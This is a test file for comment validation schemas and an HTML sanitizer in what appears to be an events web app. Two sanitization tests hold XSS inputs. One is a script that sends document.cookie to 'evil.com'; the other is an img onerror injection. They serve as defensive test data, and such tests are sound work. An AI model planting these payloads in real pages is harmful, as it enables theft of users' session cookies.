/**
 * Tests for comment-related validation and sanitization.
 */

import { CreateCommentSchema, UpdateCommentSchema } from '@/lib/validation';
import { sanitizeComment } from '@/lib/sanitize';

describe('CreateCommentSchema', () => {
  const validComment = {
    userId: 'cluser123abc456def',
    body: 'Great event, really enjoyed it!',
  };

  it('accepts a valid comment', () => {
    expect(CreateCommentSchema.safeParse(validComment).success).toBe(true);
  });

  it('accepts a reply with parentId', () => {
    const result = CreateCommentSchema.safeParse({
      ...validComment,
      parentId: 'clparent123abc456',
    });
    expect(result.success).toBe(true);
  });

  it('rejects empty body', () => {
    const result = CreateCommentSchema.safeParse({ ...validComment, body: '' });
    expect(result.success).toBe(false);
  });

  it('rejects body over 2000 characters', () => {
    const result = CreateCommentSchema.safeParse({
      ...validComment,
      body: 'a'.repeat(2001),
    });
    expect(result.success).toBe(false);
  });

  it('rejects missing userId', () => {
    const result = CreateCommentSchema.safeParse({ body: 'Valid body text here' });
    expect(result.success).toBe(false);
  });
});

describe('UpdateCommentSchema', () => {
  it('accepts isHidden update', () => {
    const result = UpdateCommentSchema.safeParse({
      userId: 'cluser123abc456def',
      isHidden: true,
    });
    expect(result.success).toBe(true);
  });

  it('accepts body update', () => {
    const result = UpdateCommentSchema.safeParse({
      userId: 'cluser123abc456def',
      body: 'Updated comment text',
    });
    expect(result.success).toBe(true);
  });

  it('accepts empty update (no fields — partial)', () => {
    const result = UpdateCommentSchema.safeParse({ userId: 'cluser123abc456def' });
    expect(result.success).toBe(true);
  });
});

describe('Comment sanitization integration', () => {
  it('strips script tags from comment body before storage', () => {
    const malicious = '<script>fetch("evil.com?c="+document.cookie)</script>Love this event!';
    const sanitized = sanitizeComment(malicious);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('fetch(');
    expect(sanitized).toBe('Love this event!');
  });

  it('strips img src injection', () => {
    const injected = '<img src="x" onerror="alert(1)">Normal text';
    const sanitized = sanitizeComment(injected);
    expect(sanitized).toBe('Normal text');
  });

  it('preserves normal apostrophes and punctuation', () => {
    const normal = "It's a great event! Can't wait for next year.";
    expect(sanitizeComment(normal)).toBe(normal);
  });

  it('truncates to maxLength', () => {
    const result = sanitizeComment('x'.repeat(5000), 2000);
    expect(result.length).toBe(2000);
  });
});
